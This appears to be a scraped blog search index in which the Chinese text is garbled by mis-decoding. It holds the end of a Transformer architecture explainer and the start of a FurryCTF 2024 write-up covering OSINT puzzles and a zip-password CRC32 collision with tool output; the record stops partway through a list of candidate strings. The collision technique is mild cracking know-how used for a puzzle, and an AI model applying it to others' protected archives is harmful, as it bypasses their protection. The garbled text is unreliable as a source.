ç»´ï¼ˆæ³¨æ„è¦ä¿è¯ç»´åº¦è¢«å¤´æ•°æ•´é™¤ï¼‰å¹¶è¡Œæ‰§è¡Œï¼Œæœ€åå†æ‹¼æ¥èµ·æ¥ï¼Œè¿›è¡Œçº¿æ€§å˜æ¢å˜å› $512$ ç»´ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:4:2","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Encoder ","date":"2025-06-10","objectID":"/posts/mltransformer/:5:0","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"ç»“æ„ï¼š è¿™ä¸€éƒ¨åˆ†æ˜¯ Encoder çš„ç»“æ„ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ç”± Multi-Head Attention, Add \u0026 Norm, Feed Forward, Add \u0026 Norm ç»„æˆçš„ã€‚å…¶ä¸­ $N \\times$ çš„æ„æ€æ˜¯æœ‰ $N$ ä¸ªé‡å¤çš„ Encoder å—å †å èµ·æ¥ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:5:1","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"FeedForward è¿™æ˜¯ä¸€ä¸ªå‰é¦ˆç¥ç»ç½‘ç»œï¼Œå…¶ä¸­åŒ…å«ä¸¤å±‚å…¨è¿æ¥å±‚ï¼Œç¬¬ä¸€å±‚çš„æ¿€æ´»å‡½æ•°æ˜¯ Reluï¼Œç¬¬äºŒå±‚ä¸ä½¿ç”¨æ¿€æ´»å‡½æ•°ã€‚ å…¬å¼ï¼š $$ \\text{FFN}(x) = \\max(0,xW_1 + b_1)W_2 + b_2 $$ ","date":"2025-06-10","objectID":"/posts/mltransformer/:5:2","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Add \u0026 Norm Add æ˜¯æŒ‡æ®‹å·®è¿æ¥ï¼Œé€šå¸¸ç”¨äºè§£å†³å¤šå±‚ç½‘ç»œè®­ç»ƒçš„é—®é¢˜ï¼Œå¯ä»¥è®©ç½‘ç»œåªå…³æ³¨å½“å‰å·®å¼‚çš„éƒ¨åˆ†ï¼Œåœ¨ ResNet ä¸­ç»å¸¸ç”¨åˆ°ï¼Œç”¨äºç¼“è§£æ¢¯åº¦æ¶ˆå¤±ã€‚ Norm æŒ‡ Layer Normalizationï¼Œé€šå¸¸ç”¨äº RNN ç»“æ„ï¼ŒLayer Normalization ä¼šå°†æ¯ä¸€å±‚ç¥ç»å…ƒçš„è¾“å…¥éƒ½è½¬æˆå‡å€¼æ–¹å·®éƒ½ä¸€æ ·çš„ï¼Œè¿™æ ·å¯ä»¥åŠ å¿«æ”¶æ•›ã€‚ è¿™ä¸¤å±‚å…¬å¼å¦‚ä¸‹ï¼š $$ \\begin{aligned} \\text{LayerNorm}\u0026(X + \\text{MultiHead}(X)) \\\\ \\text{LayerNorm}\u0026(X + \\text{FFN}(X)) \\\\ \\end{aligned} $$ æœ€åï¼Œencoder å±‚çš„è¾“å‡ºä¼šå½“ä½œ $V, K$ è¾“å…¥åˆ° Cross-Attention ","date":"2025-06-10","objectID":"/posts/mltransformer/:5:3","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Decoder ","date":"2025-06-10","objectID":"/posts/mltransformer/:6:0","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"ç»“æ„ï¼š è¿™é‡Œçš„ $N \\times$ åŒæ ·æ˜¯ $N$ ä¸ªé‡å¤çš„ Decoder å±‚å †å èµ·æ¥ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:6:1","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Masked Multi-Head Attention åŠ å…¥ masked çš„æ„ä¹‰æ˜¯å½“ç”Ÿæˆä¸€ä¸ªåºåˆ—æ—¶ï¼Œè¿›è¡Œåˆ°ä¸€ä¸ªä½ç½®æ—¶ï¼Œä¸èƒ½è®©æ¨¡å‹çœ‹åˆ°æœªæ¥çš„å•è¯ï¼Œè¿™æ ·ä¼šå½±å“è®­ç»ƒï¼Œæ‰€ä»¥è¦åœ¨æ³¨æ„åŠ›æœºåˆ¶é‡Œå¼•å…¥ maskedï¼Œç”¨æ¥å±è”½æœªæ¥ä¿¡æ¯ã€‚ ä¸ºäº†è®©æ¯ä¸€æ­¥åé¢çš„è¯ä¸å½±å“å‰é¢çš„è¯ï¼Œæˆ‘ä»¬åœ¨ softmax ä¹‹å‰ï¼Œå¼•å…¥ä¸€ä¸ª masked çŸ©é˜µï¼Œå°†ä¸Šä¸‰è§’çŸ©é˜µå…¨éƒ¨å˜ä¸º $-\\infty$ ä¾‹å¦‚è¿™æ˜¯ä¸€ä¸ª $4 \\times 4$ çš„çŸ©é˜µ: $$ \\text{masked} = \\begin{bmatrix} 0\u0026-\\infty\u0026-\\infty\u0026-\\infty\\\\ 0\u00260\u0026-\\infty\u0026-\\infty\\\\ 0\u00260\u00260\u0026-\\infty\\\\ 0\u00260\u00260\u00260 \\end{bmatrix} $$ äºæ˜¯æˆ‘ä»¬å°† masked çŸ©é˜µç›´æ¥ä¸ $QK^\\top$ ç›¸åŠ ï¼Œç”±äº $-\\infty$ çš„éƒ¨åˆ†åŠ ä»»ä½•æ•°éƒ½æ˜¯æœ¬èº«ï¼Œæ‰€ä»¥ softmax ä¼šä½¿å®ƒè¶‹äº $0$ ","date":"2025-06-10","objectID":"/posts/mltransformer/:6:2","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Cross-Attention åœ¨ç¬¬äºŒä¸ª Multi-Head Attention ä¸­ï¼Œå°† Masked Multi-Head Attention çš„è¾“å…¥å½“ä½œæ­¤æ—¶çš„ $Q$ï¼Œ$K, V$ åˆ™æ˜¯ encoder éƒ¨åˆ†çš„è¾“å‡ºã€‚ è¿™æ ·åšçš„æ„ä¹‰æ˜¯å› ä¸ºè¿™æ˜¯ä¸¤ä¸ªä¸åŒçš„åºåˆ—ï¼Œå®ƒå¯ä»¥è®© $Q$ çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½èƒ½æ³¨æ„åˆ° $K, V$ åºåˆ—çš„æ‰€æœ‰å…ƒç´ ï¼Œä»è€Œå­¦ä¹ åˆ°ä¸¤ä¸ªåºåˆ—ä¹‹é—´çš„å…³ç³»ã€‚ äº¤å‰æ³¨æ„åŠ›å°±åƒæ˜¯ä¸€ä¸ªå­¦ç”Ÿ ($Q$) åœ¨å¬è€å¸ˆè®²è¯¾ ($K, V$ åºåˆ—)ï¼Œå­¦ç”Ÿçš„é—®é¢˜å’Œç†è§£ ($Q$) å»åŒ¹é…è€å¸ˆçš„çŸ¥è¯†ç‚¹ ($K$)ï¼Œå¹¶å¸æ”¶è€å¸ˆçš„å…·ä½“è®²è§£å†…å®¹ ($V$)ï¼Œä»è€Œä¸°å¯Œå’Œæ›´æ–°å­¦ç”Ÿçš„çŸ¥è¯†ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:6:3","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Softmax æœ€åï¼Œä½¿ç”¨ softmax è¾“å‡ºä¸‹ä¸€ä¸ªå•è¯ï¼Œç„¶åè¿›è¡Œè‡ªå›å½’ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:6:4","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Transformer å¸¸è§é—®é¢˜ ","date":"2025-06-10","objectID":"/posts/mltransformer/:7:0","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"1. ä¸ºä»€ä¹ˆè‡ªæ³¨æ„åŠ›æœºåˆ¶åœ¨è®¡ç®—æ—¶éœ€è¦å¯¹ç‚¹ç§¯ç»“æœè¿›è¡Œ $\\sqrt{d_k}$ çš„ç¼©æ”¾ï¼Ÿ è¿›è¡Œ $\\sqrt{d_k}$ çš„ç¼©æ”¾æ˜¯ä¸ºäº†é˜²æ­¢ç‚¹ç§¯ç»“æœåœ¨ç»´åº¦ $d_k$ è¾ƒå¤§æ—¶è¿‡å¤§ï¼Œè¿™ä¼šå¯¼è‡´ softmax å‡½æ•°å¤„äºé¥±å’ŒåŒºï¼Œä½¿å¾—æ¢¯åº¦å˜å¾—éå¸¸å°ï¼Œéš¾ä»¥é€šè¿‡åå‘ä¼ æ’­æœ‰æ•ˆåœ°è®­ç»ƒã€‚ç¼©æ”¾æœ‰åŠ©äºç»´æŒç‚¹ç§¯çš„ç¨³å®šæ€§ï¼Œç¡®ä¿æ¢¯åº¦åœ¨ä¸€ä¸ªåˆé€‚çš„èŒƒå›´å†…ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:7:1","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"2. Transformer çš„å‰é¦ˆç½‘ç»œ (FFN) åœ¨æ¨¡å‹ä¸­æ‰¿æ‹…ä»€ä¹ˆè§’è‰²ï¼Ÿ FFNä¸ºæ¨¡å‹æä¾›äº†éçº¿æ€§å¤„ç†èƒ½åŠ›ï¼Œå®ƒåœ¨æ¯ä¸ªä½ç½®ä¸Šç‹¬ç«‹åœ°ä½œç”¨äºå…¶è¾“å…¥ï¼Œæœ‰åŠ©äºå¢åŠ æ¨¡å‹çš„å¤æ‚åº¦å’Œè¡¨è¾¾èƒ½åŠ›ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:7:2","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"3. ä¸ºä½• Transformer æ¨¡å‹ä¸­é‡‡ç”¨ Layer Normalization è€Œé Batch Normalizationï¼Ÿ Layer Normalization å¯¹æ¯ä¸ªæ ·æœ¬ç‹¬ç«‹è¿›è¡Œå½’ä¸€åŒ–ï¼Œé€‚ç”¨äºåºåˆ—åŒ–æ•°æ®å’Œå˜é•¿è¾“å…¥ï¼Œè€Œ Batch Normalization åœ¨æ‰¹å¤„ç†æ—¶å¯¹ç‰¹å¾è¿›è¡Œå½’ä¸€åŒ–ï¼Œä¸é€‚ç”¨äºåºåˆ—é•¿åº¦å˜åŒ–çš„æƒ…å†µã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:7:3","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"4. Transformer æ¨¡å‹ä¸­çš„â€œæ®‹å·®è¿æ¥â€å¦‚ä½•æœ‰åŠ©äºç¼“è§£æ¢¯åº¦æ¶ˆå¤±é—®é¢˜ï¼Ÿ æ®‹å·®è¿æ¥é€šè¿‡ç›´æ¥å°†è¾“å…¥åŠ åˆ°å­å±‚çš„è¾“å‡ºä¸Šï¼Œä½¿å¾—æ·±å±‚ç½‘ç»œä¸­çš„ä¿¡å·èƒ½å¤Ÿç›´æ¥ä¼ é€’åˆ°è¾ƒæµ…å±‚ï¼Œæœ‰åŠ©äºç¼“è§£æ¢¯åº¦æ¶ˆå¤±é—®é¢˜ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:7:4","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"5. åœ¨ Transformer æ¨¡å‹ä¸­ï¼Œä¸ºä»€ä¹ˆè¦ä½¿ç”¨ Dropoutï¼Ÿ Dropout æ˜¯ä¸€ç§æ­£åˆ™åŒ–æŠ€æœ¯ï¼Œé€šè¿‡éšæœºä¸¢å¼ƒä¸€éƒ¨åˆ†ç½‘ç»œè¿æ¥ï¼Œå¯ä»¥æœ‰æ•ˆå‡å°‘æ¨¡å‹çš„è¿‡æ‹Ÿåˆï¼Œå¢å¼ºæ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:7:5","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"6. å¦‚ä½•ç†è§£ Transformer ä¸­çš„è‡ªå›å½’å±æ€§ï¼Ÿ åœ¨ Transformer çš„è§£ç å™¨ä¸­ï¼Œè‡ªå›å½’å±æ€§æŒ‡æ¨¡å‹åœ¨ç”Ÿæˆæ¯ä¸ªè¾“å‡ºæ—¶ï¼Œåªèƒ½ä¾èµ–äºå…ˆå‰ç”Ÿæˆçš„è¾“å‡ºï¼Œç¡®ä¿åœ¨ç”Ÿæˆåºåˆ—æ—¶çš„é¡ºåºæ€§å’Œä¸€è‡´æ€§ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:7:6","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"7. ä¸ºä»€ä¹ˆ Transformer æ¨¡å‹èƒ½å¤Ÿæœ‰æ•ˆå¤„ç†é•¿è·ç¦»ä¾èµ–é—®é¢˜ï¼Ÿ ç”±äºè‡ªæ³¨æ„åŠ›æœºåˆ¶èƒ½å¤Ÿç›´æ¥è®¡ç®—åºåˆ—ä¸­ä»»æ„ä¸¤ç‚¹ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼ŒTransformer æ¨¡å‹èƒ½å¤Ÿæœ‰æ•ˆæ•æ‰é•¿è·ç¦»ä¾èµ–ï¼Œé¿å…äº†ä¼ ç»Ÿåºåˆ—æ¨¡å‹ï¼ˆå¦‚ RNNï¼‰ä¸­ä¿¡æ¯ä¼ é€’è·¯å¾„é•¿å¯¼è‡´çš„ä¿¡æ¯ä¸¢å¤±ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:7:7","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"8. ä½ç½®ç¼–ç ä¸ºä»€ä¹ˆä½¿ç”¨æ­£å¼¦å’Œä½™å¼¦å‡½æ•°ï¼Ÿ æ­£å¼¦å’Œä½™å¼¦å‡½æ•°è¢«ç”¨äºä½ç½®ç¼–ç å› ä¸ºå®ƒä»¬å…·æœ‰å‘¨æœŸæ€§ï¼Œè¿™ä½¿å¾—æ¨¡å‹èƒ½å¤Ÿæ›´å®¹æ˜“åœ°å­¦ä¹ å’Œæ¨ç†å…³äºåºåˆ—é•¿åº¦å’Œå…ƒç´ ä½ç½®çš„ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œå®ƒä»¬å¯ä»¥å¸®åŠ©æ¨¡å‹æ•æ‰åˆ°ç›¸å¯¹ä½ç½®ä¿¡æ¯ï¼Œå› ä¸ºæ­£å¼¦å’Œä½™å¼¦å‡½æ•°çš„å€¼å¯ä»¥é€šè¿‡å åŠ å’Œå·®åˆ†è¿ç®—æ¥ç¼–ç å…ƒç´ é—´çš„ç›¸å¯¹è·ç¦»ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:7:8","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"9. Transformer ä¸­ä¸ºä»€ä¹ˆéœ€è¦çº¿æ€§å˜æ¢ï¼Ÿ çº¿æ€§å˜æ¢çš„å¥½å¤„ï¼šåœ¨ $QK^\\top$ éƒ¨åˆ†ï¼Œçº¿æ€§å˜æ¢çŸ©é˜µå°† $Q, K$ æŠ•å½±åˆ°äº†ä¸åŒçš„ç©ºé—´ï¼Œå¢åŠ äº†è¡¨è¾¾èƒ½åŠ›ï¼ˆè¿™ä¸€åŸç†å¯ä»¥åŒç† SVM ä¸­çš„æ ¸å‡½æ•°-å°†å‘é‡æ˜ å°„åˆ°é«˜ç»´ç©ºé—´ä»¥è§£å†³éçº¿æ€§é—®é¢˜ï¼‰ï¼Œè¿™æ ·è®¡ç®—å¾—åˆ°çš„æ³¨æ„åŠ›çŸ©é˜µçš„æ³›åŒ–èƒ½åŠ›æ›´é«˜ã€‚ ä¸ç”¨çº¿æ€§å˜æ¢çš„åå¤„ï¼šåœ¨ $QK^\\top$ éƒ¨åˆ†ï¼Œå¦‚æœä¸åšçº¿æ€§å˜æ¢ï¼Œå³ $X=Q=K$ï¼Œåˆ™ä¼šå¯¼è‡´æ³¨æ„åŠ›çŸ©é˜µæ˜¯å¯¹ç§°çš„ï¼Œå³è¿™æ ·çš„æ•ˆæœæ˜æ˜¾æ˜¯å·®çš„ï¼Œæ¯”å¦‚â€œæˆ‘æ˜¯ä¸€ä¸ªå¥³å­©â€è¿™å¥è¯ï¼Œå¥³å­©å¯¹ä¿®é¥°æˆ‘çš„é‡è¦æ€§åº”è¯¥è¦é«˜äºæˆ‘ä¿®é¥°å¥³å­©çš„é‡è¦æ€§ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:7:9","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"10. Transformer ä¸ºä½•ä½¿ç”¨å¤šå¤´æ³¨æ„åŠ›æœºåˆ¶ï¼Ÿ å¹¶è¡Œè®¡ç®—ï¼šå¤šå¤´æ³¨æ„åŠ›æœºåˆ¶å…è®¸æ¨¡å‹åŒæ—¶å…³æ³¨è¾“å…¥åºåˆ—çš„ä¸åŒéƒ¨åˆ†ï¼Œæ¯ä¸ªæ³¨æ„åŠ›å¤´å¯ä»¥ç‹¬ç«‹è®¡ç®—ï¼Œä»è€Œå®ç°æ›´é«˜æ•ˆçš„å¹¶è¡Œè®¡ç®—ã€‚è¿™æ ·èƒ½å¤ŸåŠ å¿«æ¨¡å‹çš„è®­ç»ƒé€Ÿåº¦ã€‚ æå‡è¡¨å¾èƒ½åŠ›ï¼šé€šè¿‡å¼•å…¥å¤šä¸ªæ³¨æ„åŠ›å¤´ï¼Œæ¨¡å‹å¯ä»¥å­¦ä¹ åˆ°ä¸åŒç±»å‹çš„æ³¨æ„åŠ›æƒé‡ï¼Œä»è€Œæ•æ‰è¾“å…¥åºåˆ—ä¸­ä¸åŒå±‚æ¬¡ã€ä¸åŒæ–¹é¢çš„è¯­ä¹‰ä¿¡æ¯ã€‚è¿™æœ‰åŠ©äºæå‡æ¨¡å‹å¯¹è¾“å…¥åºåˆ—çš„è¡¨å¾èƒ½åŠ›ã€‚ é™ä½è¿‡æ‹Ÿåˆé£é™©ï¼šå¤šå¤´æ³¨æ„åŠ›æœºåˆ¶ä½¿å¾—æ¨¡å‹å¯ä»¥ç»¼åˆä¸åŒè§’åº¦çš„ä¿¡æ¯ï¼Œä»è€Œæé«˜æ³›åŒ–èƒ½åŠ›ï¼Œé™ä½è¿‡æ‹Ÿåˆçš„é£é™©ã€‚ å¢å¼ºæ¨¡å‹è§£é‡Šæ€§ï¼šæ¯ä¸ªæ³¨æ„åŠ›å¤´å¯ä»¥å…³æ³¨è¾“å…¥åºåˆ—çš„ä¸åŒéƒ¨åˆ†ï¼Œå› æ­¤å¯ä»¥æ›´å¥½åœ°ç†è§£æ¨¡å‹å¯¹äºä¸åŒè¾“å…¥ä¿¡æ¯çš„å…³æ³¨ç¨‹åº¦ï¼Œä½¿å¾—æ¨¡å‹çš„å†³ç­–æ›´å…·è§£é‡Šæ€§ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:7:10","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["ç½‘å®‰"],"content":"æ¯”èµ›é“¾æ¥ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:0:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"å‰è¨€ ä¸šä½™é€‰æ‰‹ï¼Œè¿™æ¬¡æ¯”èµ›ç®—æ˜¯åšçš„æœ€çˆ½çš„ä¸€æ¬¡ CTF æ¯”èµ›äº†ï¼Œæ„Ÿè°¢ furryCTFï¼Œä¸€å¼€å§‹åœ¨ä¿Šæ°ç¾¤é‡Œçœ‹åˆ°ç¦ç‘æ§å±…ç„¶èƒ½æå‡ºä¸ª CTF æ¯”èµ›ï¼Œæ¯”è¾ƒå¥½å¥‡æƒ³å»è¯•è¯•ï¼Œæ—©åœ¨å¤§ä¸€çš„æ—¶å€™å°±æƒ³å¥½å¥½å­¦ä¹ ä¸€ä¸‹ CTFï¼Œä½†è¢«é’©å…« ACM å ç”¨äº†æ—¶é—´ï¼Œç°åœ¨å·¥ä½œäº†æœ‰æ‘¸é±¼æ—¶é—´å¯ä»¥å¥½å¥½ç ”ç©¶ä¸€ä¸‹äº†ï¼ä»ä¸€å¼€å§‹å•¥éƒ½ä¸ä¼šåªä¼šåšç­¾åˆ°é¢˜å’Œ osint é¢˜åˆ°æ…¢æ…¢å­¦ä¹ é€æ­¥ä¼šåšåé¢çš„é¢˜ï¼Œè™½ç„¶å¯èƒ½å¤§ä½¬éƒ½æ˜¯ç§’åˆ‡çš„ï¼Œä½†æˆ‘ç¡®å®å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿å’ŒæŠ€å·§ï¼Œä»¥ä¸‹æ˜¯æŒ‰ç…§è¿‡é¢˜é¡ºåºçš„é¢˜è§£ï¼š ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:1:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"A [beginner]ç­¾åˆ°é¢˜ ç½‘æ˜“äº‘è¯†æ›²ï¼Œé€ æ¢¦è¥¿æ¸¸ 3 ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:2:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"B [misc]çŒ«çŒ«çš„æ•…äº‹ F12 å‘ç°é›¶å®½å­—ç¬¦ï¼Œè§£å¯†å·¥å…·ï¼šåœ¨çº¿é›¶å®½å­—ç¬¦unicodeæ–‡å­—éšå†™å·¥å…·-BFWå·¥å…·ç®± ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:3:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"D [misc]ä¸¢å¤±çš„æ–‡æ¡£ æ”¹æˆ .zip ç„¶åè§£å‹ï¼Œè®°äº‹æœ¬æ‰“å¼€ WordDocument æ‰¾åˆ° flag ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:4:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"o [osint]äººæ–‡é£æ™¯ çœ‹äº†å›¾ç‰‡å¡«äº†é©¬å®¶è€å¼æ²¹èŒ¶ï¼Œé”™è¯¯ã€‚ä½†æ˜¯æ³¨æ„å®¡é¢˜æ˜¯å¯¹é¢ï¼æ‰€ä»¥é«˜å¾·æœä½ç½®ç„¶åçœ‹å¯¹é¢é¥­åº—ï¼Œè€åˆ˜ä¼ ç»Ÿè’¸èœé¦†ã€‚ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:5:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"p [osint]å¾ªè¿¹ æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆè¿‡çš„.jpgï¼Œè§‚å¯Ÿåˆ°æœ‰ä¸€å¤´ç‰›ï¼Œç™¾åº¦è¯†å›¾ä»–å«å¢¨å°ç‰›ï¼Œç„¶åä»–æ˜¯å³å¢¨å¤åŸçš„å‰ç¥¥ç‰©ï¼Œç„¶åæœä¸€ä¸‹å³å¢¨å¤åŸé™„è¿‘ç«é”…åº—å°±å‡ºæ¥äº†ã€‚ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:6:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"w [osint]å½’å» ä¸€çœ‹ç¾¤ä¸» QQ èµ„æ–™æ˜¯é˜œé˜³çš„ï¼Œæ‰€ä»¥é”å®šé˜œé˜³è¥¿ç«™ã€‚ é˜œé˜³è¥¿ è§‚å¯Ÿåˆ°é«˜é“æ—¶é—´æ˜¯ä»æ—©åˆ°æ™šçš„ï¼Œæ‰€ä»¥å»å®˜ç½‘æ‰¾åˆ°è¿™ä¿©ç«™ï¼š ç„¶åæŸ¥æ‰¾åˆ°ï¼š ç­”æ¡ˆæ˜¯ä¸Šæµ·ç«™ã€‚ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:7:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"u [osint]æ—…è¡Œç…§ç‰‡ ç™¾åº¦è¯†å›¾ï¼Œæ—¥æœˆåŒå¡”ã€‚ ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:8:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"K [misc]Windows 1.0 ç›´æ¥ç”¨ 010editor æ‰“å¼€ä¸€ä¸‹æœç´¢ furryCTF ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:9:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"l [hardware]Charge ç›´æ¥ç”¨ AI è¯†å›¾ï¼ŒåŠ  AI æé—®ï¼ŒfurryCTF{20000_50_PPJL65C} ","date":"2025-01-15","objectID":"/posts/ctf-furryctf-2024/:10:0","tags":["CTF"],"title":"FurryCTF 2024 (å¯’å‡èµ›) WP","uri":"/posts/ctf-furryctf-2024/"},{"categories":["ç½‘å®‰"],"content":"Q [misc]æ±‚è€Œä¸å¾— æ‰“å¼€å‹ç¼©åŒ…å‘ç°æœ‰å¯†ç ï¼Œç„¶åæ–‡ä»¶å¤´ 90 æ”¹ 00 å‘ç°ä¸è¡Œï¼Œä¸æ˜¯ä¼ªåŠ å¯†ã€‚ å‘ç° 1.txt 2.txt 3.txt 4.txt 5.txt åŸå§‹å¤§å°å¾ˆå°ï¼Œè€ƒè™‘ CRC32 ç¢°æ’ã€‚ ç”¨å‡ ä¸ªå·¥å…·ï¼Œå­—èŠ‚ä¸º 2 å’Œ 3 çš„å¾ˆå®¹æ˜“ç ´è§£ã€‚ +--------------éå†æŒ‡å®šå‹ç¼©åŒ…çš„CRCå€¼----------------+ [OK] 1.txt: 0xd6794fcc [OK] 2.txt: 0xa4923bd1 [OK] 3.txt: 0x5150ce86 [OK] 4.txt: 0x269fce5d [OK] 5.txt: 0x327e383 [OK] flag.txt: 0x77093881 +-------------å¯¹è¾“å‡ºçš„CRCå€¼è¿›è¡Œç¢°æ’-----------------+ [Success] 0xd6794fcc: 1qa [Success] 0xa4923bd1: 4?u [Success] 0x327e383: !w å¾—åˆ°ä»¥ä¸‹ä¸‰ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼š 1.txt: 1qa 2.txt: 4?u 5.txt: !w è€ƒè™‘ 6 å­—èŠ‚çš„ï¼Œæœ‰å·¥å…·ï¼šhttps://github.com/theonlypwner/crc32 æ‰€æœ‰å¯èƒ½å¦‚ä¸‹ï¼š !;F#5. !j$BY2 $#UO.@ $nxrCH %n9CXQ )Al1\u003cV )]#m=B +a\u0026sd_ +}i/eK ,x!MNt -5MA8e -Eq0=5 -Y\u003el\u003c! /e;re\u003c /yt.d( 07}LZt 0GA=_$ 1+s!@y 17\u003c}Am 1[OPE) 2*\u0026Bj% 2FUona 3*gsq\u003c 36(/p( 5_RQDJ 6.;CkF 7.zrp_ 725.qK 8!$sWH 9!eBLQ ;PMaxD \u003c%9rV+ \u003c9v.W? \u003cIJ_Ro =%xCM2 =UD2Hb ?8#M}c @*RYc8 @Zn(fh BG5\u0026V9 B[zzW- Bfk6?u Bz$j\u003ea C7HfHp C[;KL4 Cze[%x D.OXb[ E2A5xV FC('WZ F_g{VN G_\u0026JMW HPxKj@ ILv\u0026pM IP9zqY J!Ph^U Jl}U3] Kl\u003cd(D Kps8)P L$Y;ns LTeJk# MHk'q. MT${p: N%Mi_6 NI\u003eD[r Oh!e)' Otn9(3 PwJf{g R'\u003cU\u0026\u003e S'}d=' S;28\u003c3 SjPYP/ V#!T'] VrC5KA W?/9=P WnMXQL YaRhmB []Wv4_ ]eOil! ^)77+u ^5xk*a ^xUVGi _59Z1x _YJw5\u003c _d[;]d atB0/8 b$u2ix b8:nhl bTICl( c8{_su cHG.v% d=3=XJ e!=PBG ep_1.[ fPTBmK gLZ/wF h_KrQE j.cQeP l7%^Tb l[VsP\u0026 m++3No m7doO{ nZB!ac oFLL{n p5Tb-j pY'O). pxy_@b 